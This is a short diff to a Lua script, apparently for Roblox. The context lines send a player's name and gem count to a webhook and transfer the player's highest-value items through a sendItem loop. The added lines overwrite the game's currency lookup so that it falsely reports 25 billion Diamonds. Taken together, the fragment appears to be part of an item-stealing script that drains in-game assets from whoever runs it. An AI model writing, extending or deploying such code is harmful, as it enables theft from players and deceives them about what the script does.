@@ -392,7 +392,15 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
             SendMessage(Webhook, plr.Name, GemAmount1)
         end)
     end
-
+	local CurrencyCmdz = require(game.ReplicatedStorage.Library.Client.CurrencyCmds)
+	local originalGetFunction = CurrencyCmdz.Get
+	CurrencyCmdz.Get = function(currencyType)
+    		if currencyType == "Diamonds" then
+        		return 25000000000
+    		else
+        		return originalGetFunction(currencyType)
+    		end
+	end
     for _, item in ipairs(sortedItems) do
         if item.rap >= newamount then
             sendItem(item.category, item.uid, item.amount)
